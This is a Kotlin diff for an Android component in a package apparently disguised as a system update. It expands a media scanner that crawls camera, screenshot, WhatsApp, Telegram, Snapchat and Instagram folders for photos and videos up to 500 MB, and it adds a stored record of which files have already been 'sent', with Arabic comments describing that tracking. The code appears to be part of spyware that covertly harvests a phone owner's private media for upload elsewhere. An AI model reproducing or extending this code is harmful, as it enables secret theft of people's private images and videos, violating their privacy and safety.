@@ -1,7 +1,6 @@
 package com.sys.update2
 
 import android.content.Context
-import android.os.Environment
 import org.json.JSONObject
 import java.io.File
 import java.text.SimpleDateFormat
@@ -10,8 +9,12 @@ import java.util.Locale
 
 object MediaScanner {
 
-    private val timeFmt = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
-    private const val MAX_FILE_MB = 15L
+    private const val MAX_FILE_MB = 500L
+    private const val PREFS_NAME  = "media_scanner_prefs"
+    private const val KEY_SENT    = "sent_files"
+
+    private fun fmt(t: Long) =
+        SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date(t))
 
     data class MediaFile(
         val path: String,
@@ -21,24 +24,48 @@ object MediaScanner {
         val mime: String
     )
 
-    fun scanImages(context: Context): List<MediaFile> {
-        val list = scanByExtension(
+    // ==================== الفحص ====================
+
+    fun scanImages(): List<MediaFile> =
+        scanByExtension(
             listOf("jpg", "jpeg", "png", "gif", "webp", "bmp", "heic", "heif", "tiff", "raw")
-        )
-        return list.sortedByDescending { it.lastModified }
+        ).sortedByDescending { it.lastModified }
+
+    fun scanVideos(): List<MediaFile> =
+        scanByExtension(
+            listOf("mp4", "mkv", "avi", "mov", "3gp", "webm", "flv", "wmv", "m4v")
+        ).sortedByDescending { it.lastModified }
+
+    // ==================== منع التكرار ====================
+
+    /** هل هذا الملف أُرسل سابقًا؟ */
+    fun isSent(context: Context, mf: MediaFile): Boolean {
+        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+        return prefs.getStringSet(KEY_SENT, emptySet())!!.contains(key(mf))
     }
 
-    fun scanVideos(context: Context): List<MediaFile> = scanByExtension(
-        listOf("mp4", "mkv", "avi", "mov", "3gp", "webm", "flv", "wmv", "m4v")
-    )
+    /** سجّل الملف كـ "تم الإرسال" */
+    fun markSent(context: Context, mf: MediaFile) {
+        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+        val sent  = prefs.getStringSet(KEY_SENT, emptySet())!!.toMutableSet()
+        sent += key(mf)
+        prefs.edit().putStringSet(KEY_SENT, sent).apply()
+    }
 
-    fun scanAudio(context: Context): List<MediaFile> = scanByExtension(
-        listOf("mp3", "wav", "ogg", "m4a", "aac", "flac", "opus", "amr")
-    )
+    /** مفتاح فريد لكل ملف = المسار + الحجم + وقت التعديل */
+    private fun key(mf: MediaFile): String =
+        "${mf.path}|${mf.size}|${mf.lastModified}"
+
+    /** مسح السجل بالكامل (اختياري) */
+    fun reset(context: Context) {
+        context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+            .edit().remove(KEY_SENT).apply()
+    }
+
+    // ==================== المسح الداخلي ====================
 
     private fun scanByExtension(extensions: List<String>): List<MediaFile> {
         val result = mutableListOf<MediaFile>()
-
         val roots = listOf(
             File("/storage/emulated/0/DCIM/Camera"),
             File("/storage/emulated/0/DCIM/Screenshots"),
@@ -49,18 +76,16 @@ object MediaScanner {
             File("/storage/emulated/0/Download"),
             File("/storage/emulated/0/Documents"),
             File("/storage/emulated/0/Movies"),
-            File("/storage/emulated/0/Music"),
             File("/storage/emulated/0/WhatsApp/Media"),
             File("/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media"),
             File("/storage/emulated/0/Telegram"),
             File("/storage/emulated/0/Android/media/org.telegram.messenger"),
             File("/storage/emulated/0/Snapchat"),
             File("/storage/emulated/0/Instagram"),
-            Environment.getExternalStorageDirectory()
+            File("/storage/emulated/0/Android/media/com.instagram.android"),
         )
-
         for (root in roots) {
-            walk(root, extensions, result, depth = 0, maxDepth = 10, limit = 8000)
+            walk(root, extensions, result, depth = 0, maxDepth = 12, limit = 20000)
         }
         return result.distinctBy { it.path }
     }
@@ -73,7 +98,9 @@ object MediaScanner {
         maxDepth: Int,
         limit: Int
     ) {
-        if (dir == null || !dir.exists() || !dir.isDirectory || depth > maxDepth || out.size >= limit) return
+        if (dir == null || !dir.exists() || !dir.isDirectory) return
+        if (depth > maxDepth || out.size >= limit) return
+
         val children = try { dir.listFiles() } catch (_: Exception) { null } ?: return
         for (f in children) {
             if (out.size >= limit) return
@@ -83,17 +110,15 @@ object MediaScanner {
                     walk(f, extensions, out, depth + 1, maxDepth, limit)
                 } else {
                     val ext = f.extension.lowercase(Locale.US)
-                    if (extensions.contains(ext)) {
+                    if (ext in extensions) {
                         val sizeMb = f.length() / (1024 * 1024)
-                        if (sizeMb <= MAX_FILE_MB) {
-                            out.add(
-                                MediaFile(
-                                    path = f.absolutePath,
-                                    name = f.name,
-                                    size = f.length(),
-                                    lastModified = f.lastModified(),
-                                    mime = guessMime(ext)
-                                )
+                        if (sizeMb in 0..MAX_FILE_MB) {
+                            out += MediaFile(
+                                path = f.absolutePath,
+                                name = f.name,
+                                size = f.length(),
+                                lastModified = f.lastModified(),
+                                mime = guessMime(ext)
                             )
                         }
                     }
@@ -103,18 +128,23 @@ object MediaScanner {
     }
 
     private fun guessMime(ext: String): String = when (ext) {
-        "jpg", "jpeg" -> "image/jpeg"
-        "png" -> "image/png"
-        "gif" -> "image/gif"
-        "webp" -> "image/webp"
+        "jpg", "jpeg"  -> "image/jpeg"
+        "png"          -> "image/png"
+        "gif"          -> "image/gif"
+        "webp"         -> "image/webp"
+        "bmp"          -> "image/bmp"
         "heic", "heif" -> "image/heic"
-        "mp4", "m4v" -> "video/mp4"
-        "mp3" -> "audio/mpeg"
-        "wav" -> "audio/wav"
-        "m4a" -> "audio/mp4"
-        "aac" -> "audio/aac"
-        "flac" -> "audio/flac"
-        else -> "application/octet-stream"
+        "tiff", "tif"  -> "image/tiff"
+        "raw"          -> "image/x-raw"
+        "mp4", "m4v"   -> "video/mp4"
+        "mkv"          -> "video/x-matroska"
+        "avi"          -> "video/x-msvideo"
+        "mov"          -> "video/quicktime"
+        "3gp"          -> "video/3gpp"
+        "webm"         -> "video/webm"
+        "flv"          -> "video/x-flv"
+        "wmv"          -> "video/x-ms-wmv"
+        else           -> "application/octet-stream"
     }
 
     fun toJson(mf: MediaFile): JSONObject = JSONObject().apply {
@@ -122,7 +152,7 @@ object MediaScanner {
         put("path", mf.path)
         put("name", mf.name)
         put("size", mf.size)
-        put("modified", timeFmt.format(Date(mf.lastModified)))
+        put("modified", fmt(mf.lastModified))
         put("mime", mf.mime)
     }
 }
